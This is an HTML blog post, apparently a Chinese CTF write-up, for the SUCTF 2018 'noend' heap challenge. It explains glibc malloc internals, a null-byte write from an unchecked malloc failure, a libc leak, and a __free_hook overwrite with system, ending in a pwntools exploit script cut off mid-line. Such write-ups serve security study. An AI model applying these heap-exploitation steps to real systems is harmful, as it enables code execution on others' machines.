@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="suctf2018-noend">
+<meta property="og:url" content="http://yoursite.com/2018/07/09/suctf2018-noend/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/07/09/suctf2018-noend/main.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/09/suctf2018-noend/heap.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/09/suctf2018-noend/top.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/09/suctf2018-noend/UB.png">
+<meta property="og:updated_time" content="2018-07-09T10:13:54.909Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="suctf2018-noend">
+<meta name="twitter:description" content="基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/09/suctf2018-noend/main.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/09/suctf2018-noend/"/>
+
+
+
+
+
+  <title>suctf2018-noend | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/09/suctf2018-noend/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">suctf2018-noend</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T09:55:02+08:00">
+                2018-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><img src="/2018/07/09/suctf2018-noend/main.png" alt="main函数"></p>
+<p>函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。</p>
+<p>下面这个函数就是当调用malloc时执行的函数，它会首先获取一个分配区（<code>arena_get</code>），然后调用<code>_int_malloc</code>分配内存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取分配区</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">//分配内存</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="comment">//分配失败时，换到其他分配区内分配</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于noend程序中对输入的大小没有做限制，如果尝试输入一个很大的值，该值大于mmap分配的内存块设定的最大值（<code>n_mmaps_max</code>）,malloc在使用<code>_int_malloc</code>分配内存时，由于从fast bins，last remainder，small bins，large bins和top chunk都分配失败时，会调用<code>sysmalloc</code>函数，下面是对<code>sysmalloc</code>的简化。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">   		<span class="comment">//由于输入的值已经大于n_mmaps_max，不会进入此处执行</span></span><br><span class="line">    	……</span><br><span class="line">	&#125;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="comment">//考虑初始情况下都是在main_arena中进行分配，此处也不会执行</span></span><br><span class="line">    	……</span><br><span class="line">	&#125;</span><br><span class="line"> <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123; <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">      size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">        size -= old_size;</span><br><span class="line">      </span><br><span class="line">      size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//sbrk（MORECORE）是通过将数据段的下界移动来分配连续内存，当size很大时，sbrk将会失败：MORECORE_FAILURE</span></span><br><span class="line">          brk = (<span class="keyword">char</span> *) (MORECORE (size));</span><br><span class="line">          LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">          ……</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">            size = ALIGN_UP (size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (MMAP_AS_MORECORE_SIZE))</span><br><span class="line">            size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">//使用MMAP分配size大小的连续内存</span></span><br><span class="line">              <span class="keyword">char</span> *mbrk = (<span class="keyword">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (mbrk != MAP_FAILED)</span><br><span class="line">                &#123;</span><br><span class="line">                 	……</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">          ……</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当前top大小为size，与申请分配的大小nb+MINSIZE比较</span></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* catch all failure paths */</span></span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>当试图申请一块巨大的内存时，sbrk和mmap都会失败，最终<code>_int_malloc</code>将会return 0。<code>__libc_malloc</code>对返回值进行判断，如果返回为0且分配区不为空时，就调用<code>arena_get_retry</code>重新获取一个新的分配区，并在新的分配区里分配内存。奇怪的是，如果此时<code>_int_malloc</code>又一次分配失败返回0，<code>__libc_malloc</code>也不会有其他操作了，直接返回0（assert是在debug模式下起作用的）。返回0之后，下面几句执行起来就会有问题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">   read(<span class="number">0</span>, buf, size);</span><br><span class="line">   *((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>由于malloc返回了0，buf的值为0，read就是向0中写入内容，而<code>*(buf+size-1)=0</code>这一块，<strong>相当于向<code>*(size-1)</code>中写入0。</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在<code>_init_free</code>函数中，会对要释放的chunk的size做检查，检查发生在已经与前后块合并完成之后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果size大于设定的阈值，就会对fastbin进行合并（<code>malloc_consolidate</code>）。合并之后的块会放入到unsorted bin中（具体可以查看<code>malloc_consolidate</code>的源码），这时候将有机会利用unsorted bin泄露libc地址。</p>
+<p>由于本题只对小于0x80的内存进行free，而且释放fastbin大小的块时是不会走到<code>malloc_consolidate</code>这一步的，所以可以通过malloc(0x7f)来触发<code>malloc_consolidate</code>：实际会分配0x90大小，属于small bin，释放的时候会与top合并，此时由于size大于阈值，由此触发fastbin合并操作。所以在0x7f之前再申请几块fastbin的内存。</p>
+<p><em>注：fastbin的块即使在释放之后，P位也不会置0，在<code>malloc_consolidate</code>才会置0。</em></p>
+<p>如果分别申请0x20和0x30，在合并之前它们分别呆在不同的fastbins里，然后执行<code>malloc_consolidate</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">	  <span class="keyword">do</span> &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          <span class="comment">//根据size找到下一块及大小</span></span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">//如果前一块是空闲块，合并</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//下一块不是top</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="comment">//下一块时空闲块，合并</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span><span class="comment">//下一块不是空闲块，将下一块中记录本块是否空闲的P位置0</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将p放入到unsorted bin当中</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//下一块是top，合并</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">	   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>即0x20（实际0x30）的块先放入unsorted bin，此时它的fd和bk已经写好，然后0x30（实际0x40）的块先与0x20的块合并，然后又与后面的top合并，原来0x20的头变为top头。</p>
+<p><img src="/2018/07/09/suctf2018-noend/heap.png" alt="heap"></p>
+<p>此后再分配一块内存并写入前8字节，就能读取到原来0x20的bk指针了，由此泄露地址。</p>
+<h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>参考<a href="https://changochen.github.io/2018/05/28/suctf/" target="_blank" rel="noopener">Ne0出题人大佬</a>的wp，用到了一个神奇的方法：事先写好一个字段作为top的大小，值为：<code>free_hook-top_addr + system_addr</code>，然后再从top分出<code>free_hook-top_addr</code> （大概为这个值）大小，并添加一些偏移，使得分配之后的top头中size字段正好能落在free_hook上，即将system_addr写入到free_hook。</p>
+<p>之前在主分配区泄露了libc的地址，同样，我们也能泄露切换之后的分配区的top地址，原因是泄露地址时bk记录的是unsorted bin的地址，也就是实际内容-0x10处，而这个位置恰好记录的是top地址。</p>
+<p><img src="/2018/07/09/suctf2018-noend/top.png" alt=""></p>
+<p><img src="/2018/07/09/suctf2018-noend/UB.png" alt="这个header的前八个字节恰好是记录top的地址，而实际上这个header是不存在的，这里画出来是便于理解"></p>
+<p>上面提到的事先写好一个字段为top的大小，然后是要通过malloc的漏洞，向某处写一个0。这个某处就可以是top的地址处，这样能让top向前提升几个字节，提升后能使top的大小正好为<code>free_hook-top_addr + system_addr</code>，之后再次malloc就会从修改后的top处分配内存，完成将system的地址写入到free_hook中。这里需要对写入的内容加入一些偏移，使得top的size字段对应于free_hook。</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./noend'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">routine</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	time.sleep(<span class="number">0.3</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(content)</span><br><span class="line"></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0gur0'</span>)<span class="comment">#0</span></span><br><span class="line">routine(<span class="number">0x30</span>,<span class="string">'0gur1'</span>)<span class="comment">#1</span></span><br><span class="line">routine(<span class="number">0x7f</span>,<span class="string">'0gur2'</span>)<span class="comment">#2</span></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">data = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">offset = <span class="number">0x7f7c2d6dbb78</span><span class="number">-0x7f7c2d317000</span></span><br><span class="line">libc_base = data -offset</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x '</span>%sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送一个很大的size，从而切换到非主分配区</span></span><br><span class="line">p.sendline(str(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line"><span class="comment">#泄露非主分配区记录的top地址</span></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0gur0'</span>)<span class="comment">#0</span></span><br><span class="line">routine(<span class="number">0x30</span>,<span class="string">'0gur1'</span>)<span class="comment">#1</span></span><br><span class="line">routine(<span class="number">0x7f</span>,<span class="string">'0gur2'</span>)<span class="comment">#2</span></span><br><span class="line">routine(<span 